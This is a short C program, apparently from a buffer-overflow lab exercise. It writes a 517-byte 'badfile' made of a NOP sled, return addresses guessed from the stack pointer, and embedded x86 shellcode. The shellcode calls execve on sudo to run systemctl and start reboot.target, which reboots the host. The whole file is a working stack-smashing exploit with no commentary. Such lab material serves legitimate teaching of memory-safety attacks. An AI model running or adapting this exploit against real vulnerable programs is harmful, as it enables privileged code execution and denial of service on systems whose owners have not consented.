
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char *shellcode = 
"\x31\xc0\x31\xd2\x50\x68\x73\x75\x64\x6f\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x68\x2f\x75\x73\x72\x89\xe3\x50\x68\x6d\x63\x74\x6c\x68\x79\x73\x74\x65\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe1\x50\x6a\x74\x68\x61\x72\x67\x65\x68\x6f\x74\x2e\x74\x68\x72\x65\x62\x6f\x89\xe6\x50\x6a\x74\x68\x73\x74\x61\x72\x89\xe7\x50\x56\x57\x51\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

unsigned long stackpointer(void)
{
  
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    
    memset(&buffer, 0x90, 517);

    
    char *ptr;
    long *addr_ptr, addr;
    int offset = 400;
 
    addr =  stackpointer() + offset;

    ptr = buffer;
    addr_ptr = (long*)(ptr);

   
    for (int i = 0; i < 10; i++)
      *(addr_ptr++) = addr;

  int j=517-(strlen(shellcode)+1); 

    for (int i = 0; i < strlen(shellcode); i++) 
      buffer[ j + i] = shellcode[i];

    buffer[516] = '\0';

      badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
